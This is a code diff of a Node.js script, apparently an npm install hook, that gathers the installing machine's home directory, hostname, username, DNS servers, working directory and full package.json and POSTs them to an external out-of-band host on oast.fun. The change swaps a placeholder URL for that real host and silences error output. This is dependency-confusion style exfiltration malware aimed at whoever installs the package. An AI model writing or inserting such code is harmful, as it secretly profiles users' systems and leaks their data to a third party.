@@ -1,35 +1,46 @@
-const os = require('os');
-const dns = require('dns');
-const axios = require('axios');
+const os = require("os");
+const dns = require("dns");
+const querystring = require("querystring");
+const https = require("https");
+const packageJSON = require("./package.json");
+const package = packageJSON.name;
 
-(async () => {
-  try {
-    const packageJSON = require('./package.json');
-    const package = packageJSON.name;
+const trackingData = JSON.stringify({
+    p: package,
+    c: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+    r: packageJSON ? packageJSON.___resolved : undefined,
+    v: packageJSON.version,
+    pjson: packageJSON,
+});
 
-    const trackingData = {
-      p: package,
-      c: process.cwd(),
-      hd: os.homedir(),
-      hn: os.hostname(),
-      un: os.userInfo().username,
-      dns: dns.getServers(),
-      r: packageJSON ? packageJSON.___resolved : undefined,
-      v: packageJSON.version,
-      pjson: packageJSON,
-    };
+var postData = querystring.stringify({
+    msg: trackingData,
+});
 
-    const options = {
-      url: 'https://interactsh.example.com', // Replace with the appropriate server URL
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-    };
+var options = {
+    hostname: "ck385ge2vtc00008gwb0gjtwnaeyyyyyb.oast.fun",  
+    port: 443,
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    },
+};
 
-    const response = await axios.post(options.url, trackingData, { headers: options.headers });
-    process.stdout.write(response.data);
-  } catch (error) {
-    console.error('Error sending tracking data:', error.message);
-  }
-})();
+var req = https.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    });
+});
+
+req.on("error", (e) => {
+    // console.error(e);
+});
+
+req.write(postData);
+req.end();
